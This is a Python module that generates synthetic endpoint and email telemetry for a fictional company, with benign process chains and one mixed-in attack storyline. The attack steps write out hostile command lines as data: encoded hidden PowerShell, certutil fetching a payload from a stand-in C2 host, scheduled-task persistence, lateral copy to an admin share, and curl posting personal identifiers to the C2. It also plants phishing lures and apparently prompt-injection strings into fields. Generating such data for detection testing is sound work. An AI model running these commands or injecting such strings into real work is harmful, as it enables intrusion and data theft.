"""A small, consistent world behind the synthetic exports: devices, users and
binaries that keep their attributes across rows and tables, process trees in
time order, and one attack storyline mixed into benign activity.

The generator asks `Context.resolve(column)` first; columns the world doesn't
model fall back to the per-column rules in generator.py.
"""
from __future__ import annotations

import hashlib
import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta

from .values import Faker, ascii_name

# Binary catalogue: name -> (folder, signer, company, product, size bytes).
# Sizes are typical for Windows 11 23H2 builds (rounded; not exact).
SYS32 = r"C:\Windows\System32"
BINARIES = {
    "explorer.exe": (r"C:\Windows", "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 5_500_000),
    "svchost.exe": (SYS32, "Microsoft Windows Publisher", "Microsoft Corporation", "Microsoft® Windows® Operating System", 57_000),
    "services.exe": (SYS32, "Microsoft Windows Publisher", "Microsoft Corporation", "Microsoft® Windows® Operating System", 730_000),
    "cmd.exe": (SYS32, "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 323_000),
    "powershell.exe": (SYS32 + r"\WindowsPowerShell\v1.0", "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 455_000),
    "rundll32.exe": (SYS32, "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 71_000),
    "certutil.exe": (SYS32, "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 1_560_000),
    "schtasks.exe": (SYS32, "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 235_000),
    "net.exe": (SYS32, "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 59_000),
    "whoami.exe": (SYS32, "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 74_000),
    "curl.exe": (SYS32, "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 570_000),
    "wmic.exe": (SYS32 + r"\wbem", "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 515_000),
    "taskhostw.exe": (SYS32, "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 101_000),
    "msedge.exe": (r"C:\Program Files (x86)\Microsoft\Edge\Application", "Microsoft Corporation", "Microsoft Corporation", "Microsoft Edge", 4_200_000),
    "outlook.exe": (r"C:\Program Files\Microsoft Office\root\Office16", "Microsoft Corporation", "Microsoft Corporation", "Microsoft Outlook", 43_000_000),
    "winword.exe": (r"C:\Program Files\Microsoft Office\root\Office16", "Microsoft Corporation", "Microsoft Corporation", "Microsoft Word", 2_100_000),
    "teams.exe": (r"C:\Program Files\WindowsApps\MSTeams", "Microsoft Corporation", "Microsoft Corporation", "Microsoft Teams", 1_800_000),
    "chrome.exe": (r"C:\Program Files\Google\Chrome\Application", "Google LLC", "Google LLC", "Google Chrome", 3_000_000),
}
BENIGN_CHAINS = [  # (parent, child, command line template)
    ("explorer.exe", "outlook.exe", '"outlook.exe"'),
    ("explorer.exe", "msedge.exe", '"msedge.exe" --profile-directory=Default'),
    ("explorer.exe", "teams.exe", '"teams.exe"'),
    ("services.exe", "svchost.exe", "svchost.exe -k netsvcs -p -s Schedule"),
    ("svchost.exe", "taskhostw.exe", "taskhostw.exe"),
    ("explorer.exe", "chrome.exe", '"chrome.exe"'),
    ("explorer.exe", "winword.exe", '"WINWORD.EXE" /n'),
]
PORTS = {"https": 443, "http": 80, "smb": 445, "rdp": 3389, "winrm": 5985, "ldap": 389, "dns": 53, "ssh": 22}


def fake_hashes(key: str) -> tuple[str, str, str]:
    h = hashlib.sha256(key.encode()).hexdigest()
    return hashlib.sha1(key.encode()).hexdigest(), h, hashlib.md5(key.encode()).hexdigest()  # noqa: S324 (fake ids)


@dataclass
class User:
    first: str
    last: str
    sam: str
    upn: str
    sid: str
    object_id: str
    netbios: str


@dataclass
class Device:
    name: str
    device_id: str
    ip: str
    os: str
    users: list[User] = field(default_factory=list)
    report_id: int = 0
    pid: int = 1000


@dataclass
class Proc:
    name: str
    folder: str
    signer: str
    company: str
    product: str
    size: int
    sha1: str
    sha256: str
    md5: str
    cmd: str
    pid: int
    created: datetime
    user: User | None


class World:
    def __init__(self, fake: Faker, rng: random.Random, devices: int = 12, users: int = 20,
                 injections: bool = True):
        self.f, self.rng, self.injections = fake, rng, injections
        self.company = fake.company()
        fake.primary = self.company
        _, slug, cc = self.company
        self.netbios = fake.mark("domain", slug.upper()[:15])
        self.mail_domain = fake.mark("domain", f"{slug}-{cc}.example")
        self.ad_domain = fake.mark("domain", f"corp.{slug}-{cc}.example")
        self.tenant = fake.tenant_id()
        self.users = [self._user() for _ in range(users)]
        self.devices = [self._device(i) for i in range(devices)]
        self.victims = rng.sample(self.devices, k=max(2, devices // 4))
        self.c2 = [f"cdn-{fake.hex(4)}.test", f"login-{fake.hex(3)}.test"]
        self.attacker_ips = [f"198.51.100.{rng.randint(1, 254)}" for _ in range(3)]

    def _user(self) -> User:
        first, last = self.f.person()
        sam = self.f.mark("account", f"{ascii_name(first)}.{ascii_name(last)}")
        self.f.mark("person_name", f"{first} {last}")
        return User(first, last, sam, self.f.mark("upn", f"{sam}@{self.mail_domain}"),
                    self.f.sid(), self.f.object_id(), self.netbios)

    def _device(self, i: int) -> Device:
        kind = self.rng.choice(["LT", "LT", "WS", "SRV"])
        name = self.f.mark("device", f"{self.company[1][:3]}-{kind.lower()}-{i:04d}.{self.ad_domain}")
        ip = self.f.mark("ip_private", f"10.{self.rng.randint(0, 3)}.{self.rng.randint(0, 255)}.{self.rng.randint(2, 254)}")
        d = Device(name, self.f.device_id(), ip,
                   "WindowsServer2022" if kind == "SRV" else self.rng.choice(["Windows11", "Windows10"]))
        d.users = self.rng.sample(self.users, k=1 if kind != "SRV" else 3)
        return d

    def proc(self, dev: Device, name: str, cmd: str, created: datetime, user: User | None,
             folder: str | None = None) -> Proc:
        dev.pid += self.rng.randint(4, 400)
        if name in BINARIES and not folder:
            fol, signer, company, product, size = BINARIES[name]
            size += self.rng.randint(-2000, 2000)
        else:  # dropped or downloaded: unsigned, in a user folder
            fol = folder or self.f.user_path().rsplit("\\", 0)[0]
            signer = company = product = ""
            size = self.rng.randint(40_000, 2_500_000)
        sha1, sha256, md5 = fake_hashes(f"{fol}\\{name}")
        return Proc(name, fol, signer, company, product, size, sha1, sha256, md5, cmd,
                    dev.pid, created, user)


@dataclass
class Context:
    """Everything one synthetic row is about."""
    world: World
    device: Device
    user: User
    ts: datetime
    proc: Proc
    parent: Proc
    grandparent: Proc
    report_id: int
    remote_ip: str = ""
    remote_port: int = 0
    remote_url: str = ""
    action: str = ""
    malicious: bool = False

    def resolve(self, col: str):
        """Value for a column the world models, else None."""
        w, f, d, u, p, pp, gp = self.world, self.world.f, self.device, self.user, self.proc, self.parent, self.grandparent
        iso = lambda t: t.strftime("%Y-%m-%dT%H:%M:%S.%f") + "0Z"  # noqa: E731
        simple = {
            "Timestamp": iso(self.ts),
            "DeviceName": d.name, "DeviceId": d.device_id, "OSPlatform": d.os,
            "MachineGroup": f"{w.company[1]}-{'servers' if 'Server' in d.os else 'clients'}",
            "ReportId": self.report_id, "TenantId": w.tenant,
            "AccountName": u.sam, "AccountDomain": u.netbios, "AccountSid": u.sid, "AccountUpn": u.upn,
            "AccountObjectId": u.object_id, "AccountDisplayName": f"{u.first} {u.last}",
            "LocalIP": d.ip, "LocalIPType": "Private", "LocalPort": self.world.rng.randint(49152, 65535),
            "ActionType": self.action or None,
        }
        if col in simple and simple[col] is not None:
            return simple[col]
        for prefix, pr in (("InitiatingProcessParent", gp), ("InitiatingProcess", pp), ("Process", p), ("", p)):
            if col.startswith(prefix):
                rest = col[len(prefix):]
                acct = pr.user or u
                vals = {
                    "FileName": pr.name, "FolderPath": f"{pr.folder}\\{pr.name}", "SHA1": pr.sha1,
                    "SHA256": pr.sha256, "MD5": pr.md5, "FileSize": pr.size, "CommandLine": pr.cmd,
                    "ProcessCommandLine": pr.cmd, "Id": pr.pid, "ProcessId": pr.pid,
                    "CreationTime": iso(pr.created), "ProcessCreationTime": iso(pr.created),
                    "VersionInfoCompanyName": pr.company, "VersionInfoProductName": pr.product,
                    "VersionInfoOriginalFileName": pr.name, "VersionInfoInternalFileName": pr.name.rsplit(".", 1)[0],
                    "VersionInfoFileDescription": pr.product,
                    "VersionInfoProductVersion": "10.0.22631.4460" if pr.signer.startswith("Microsoft Windows")
                    else ("131.0.2903.86" if pr.signer else ""),
                    "VersionInfoFileVersion": "10.0.22631.4460" if pr.signer.startswith("Microsoft Windows") else "",
                    "VersionInfoProductVersion_": "",
                    "UniqueId": pr.pid * 1000 + 17, "SessionId": 0 if pr.user is None else 1,
                    "SignatureStatus": "Valid" if pr.signer else "Unsigned",
                    "SignerType": "OsVendor" if pr.signer.startswith("Microsoft Windows") else ("ThirdParty" if pr.signer else "None"),
                    "AccountName": acct.sam, "AccountDomain": acct.netbios, "AccountSid": acct.sid,
                    "AccountUpn": acct.upn, "AccountObjectId": acct.object_id,
                    "IntegrityLevel": "System" if pr.user is None else "Medium",
                    "TokenElevation": "TokenElevationTypeDefault",
                    "LogonId": 999 if pr.user is None else 0x3E7 + w.rng.randint(1, 9999),
                }
                if prefix == "" and col in ("FileName", "FolderPath", "SHA1", "SHA256", "MD5", "FileSize") \
                        and not col.startswith("Process") and self.action.startswith("File"):
                    continue  # DeviceFileEvents: the file, not the process (handled below)
                if rest in vals:
                    return vals[rest]
        if col == "RemoteIP":
            return self.remote_ip
        if col == "RemoteIPType":
            if not self.remote_ip:
                return ""
            return "Private" if self.remote_ip.startswith(("10.", "192.168.", "172.")) else "Public"
        if col == "RemotePort":
            return self.remote_port or ""
        if col == "RemoteUrl":
            return self.remote_url
        if col == "Protocol":
            return "Udp" if self.remote_port == 53 else "Tcp"
        if col in ("IsInitiatingProcessRemoteSession", "IsProcessRemoteSession"):
            return False
        if col in ("InitiatingProcessRemoteSessionDeviceName", "InitiatingProcessRemoteSessionIP",
                   "ProcessRemoteSessionDeviceName", "ProcessRemoteSessionIP", "AppGuardContainerId"):
            return ""
        if col == "CreatedProcessSessionId":
            return 1
        if col == "AdditionalFields" and self.action in ("ProcessCreated", "ConnectionSuccess", "ConnectionFailed",
                                                          "InboundConnectionAccepted", "ConnectionRequest",
                                                          "ListeningConnectionCreated"):
            return ""
        return None


# --- scenario -------------------------------------------------------------------

NETWORK_ACTIONS = ["ConnectionSuccess", "ConnectionSuccess", "ConnectionSuccess", "ConnectionFailed",
                   "InboundConnectionAccepted", "ConnectionRequest"]
LURES = ["Lönespec november", "Faktura {n}", "Uppdaterade bankuppgifter", "Utbetalning {iban}",
         "Delad fil: Lönespec_{first}_{last}.pdf"]


def _attack_steps(w: World, d: Device, u: User):
    """The storyline on a victim device: (parent, child, command, network)."""
    f = w.f
    c2 = w.rng.choice(w.c2)
    lure = f"Lönespec_{u.first}_{u.last}_{w.rng.randint(2024, 2026)}.docm"
    f.mark("file_pii", lure)
    temp = f"C:\\Users\\{u.sam}\\AppData\\Local\\Temp"
    target = w.rng.choice([x for x in w.devices if x is not d] or [d])
    steps = [
        ("outlook.exe", "winword.exe", f'"WINWORD.EXE" /n "C:\\Users\\{u.sam}\\Downloads\\{lure}"', None),
        ("winword.exe", "powershell.exe", f"powershell.exe -nop -w hidden -enc {f.hex(48)}", (c2, 443)),
        ("powershell.exe", "certutil.exe", f"certutil.exe -urlcache -f http://{c2}/dl/{f.hex(12)}.php {temp}\\a.exe", (c2, 80)),
        ("powershell.exe", "net.exe", f"net user {u.sam} /domain", (w.ad_domain, 389)),
        ("powershell.exe", "schtasks.exe",
         f'schtasks /create /tn "Update" /tr "C:\\Users\\{u.sam}\\Documents\\upd.ps1" /sc hourly /ru {u.netbios}\\{u.sam}', None),
        ("powershell.exe", "cmd.exe", f'cmd.exe /c copy "{temp}\\a.exe" \\\\{target.ip}\\c$\\temp', (target.ip, 445)),
        ("a.exe", "curl.exe", f'curl.exe -d "pnr={f.national_id()}&tel={f.phone()}" https://{c2}/gate', (c2, 443)),
        ("powershell.exe", "powershell.exe",
         f'powershell.exe Send-MailMessage -To {f.email()} -Subject "Utbetalning {f.iban()}"', ("smtp." + w.mail_domain, 587)),
    ]
    if w.injections:
        steps.append(("cmd.exe", "powershell.exe", f'powershell.exe -c "Write-Host \'{w.rng.choice(INJECTIONS)}\'"', None))
    return steps


from .values import INJECTIONS  # noqa: E402


def make_context(w: World, table: str, actions: list[str], ts: datetime, report_id: int) -> Context:
    rng = w.rng
    malicious = rng.random() < 0.25
    d = rng.choice(w.victims if malicious else w.devices)
    u = rng.choice(d.users)
    boot = ts - timedelta(hours=rng.randint(2, 48))
    sys_gp = w.proc(d, "services.exe", r"C:\Windows\system32\services.exe", boot, None)
    remote_ip, remote_port, remote_url = "", 0, ""
    if malicious:
        parent_name, child_name, cmd, net = rng.choice(_attack_steps(w, d, u))
    else:
        parent_name, child_name, cmd = rng.choice(BENIGN_CHAINS)
        net = rng.choice([("login.microsoftonline.com", 443), ("outlook.office365.com", 443),
                          (w.ad_domain, 389), ("dns", 53), None])
    gp = w.proc(d, "explorer.exe", r"C:\Windows\Explorer.EXE", boot + timedelta(minutes=rng.randint(1, 30)), u) \
        if parent_name != "svchost.exe" else sys_gp
    p_created = ts - timedelta(minutes=rng.randint(1, 90))
    p_folder = f"C:\\Users\\{u.sam}\\AppData\\Local\\Temp" if parent_name == "a.exe" else None
    parent = w.proc(d, parent_name, f'"{parent_name}"', p_created, u if parent_name != "svchost.exe" else None, p_folder)
    child = w.proc(d, child_name, cmd, ts - timedelta(seconds=rng.randint(0, 30)), u)
    if net:
        host, port = net
        remote_port = port
        if host == "dns":
            remote_ip = f"10.{rng.randint(0, 3)}.0.{rng.randint(2, 20)}"
        elif host.startswith("10."):
            remote_ip = host
        elif host.endswith((".test",)) or malicious and port in (80, 443):
            remote_ip = rng.choice(w.attacker_ips)
            remote_url = host
        else:
            remote_ip = w.f.mark("ip_customer", f"203.0.113.{rng.randint(1, 254)}") if host.endswith(".example") \
                else f"192.0.2.{rng.randint(1, 254)}"
            remote_url = host
    action = rng.choice(actions) if actions else ""
    if table == "DeviceProcessEvents":
        action = "ProcessCreated"
    elif table == "DeviceNetworkEvents":
        action = rng.choice(NETWORK_ACTIONS) if remote_ip else "ListeningConnectionCreated"
    return Context(w, d, u, ts, child, parent, gp, report_id, remote_ip, remote_port, remote_url, action, malicious)


def email_value(w: World, ctx: Context, col: str):
    """Email tables: one message per row, senders and recipients from the world."""
    f, u = w.f, ctx.user
    if not hasattr(ctx, "_mail"):
        if ctx.malicious:
            sender = f.mark("email", f"{w.rng.choice(['payroll', 'ekonomi', 'it-support'])}@{w.rng.choice(w.c2)}")
            subject = w.rng.choice(LURES).format(n=w.rng.randint(1000, 9999), iban=f.iban(), first=u.first, last=u.last)
            if "{first}" in subject or "Lönespec_" in subject:
                f.mark("file_pii", subject.split(": ", 1)[-1])
            if w.injections and w.rng.random() < 0.1:
                subject = w.rng.choice(INJECTIONS)
        else:
            other = w.rng.choice(w.users)
            sender = other.upn
            subject = w.rng.choice(["Veckomöte", "Re: Budget Q4", "Lunch?", "Projektstatus", "Fwd: Avtal"])
        ctx._mail = {"sender": sender, "subject": subject, "id": f.uuid()}
    m = ctx._mail
    sender_domain = m["sender"].split("@", 1)[1]
    vals = {
        "SenderFromAddress": m["sender"], "SenderMailFromAddress": m["sender"],
        "SenderFromDomain": sender_domain, "SenderMailFromDomain": sender_domain,
        "SenderDisplayName": m["sender"].split("@")[0],
        "RecipientEmailAddress": u.upn, "RecipientObjectId": u.object_id,
        "Subject": m["subject"], "NetworkMessageId": m["id"],
        "EmailDirection": "Inbound" if ctx.malicious else "Intra-org",
        "DeliveryAction": "Delivered", "DeliveryLocation": "Inbox/folder",
        "SenderIPv4": w.rng.choice(w.attacker_ips) if ctx.malicious else ctx.device.ip,
    }
    return vals.get(col)
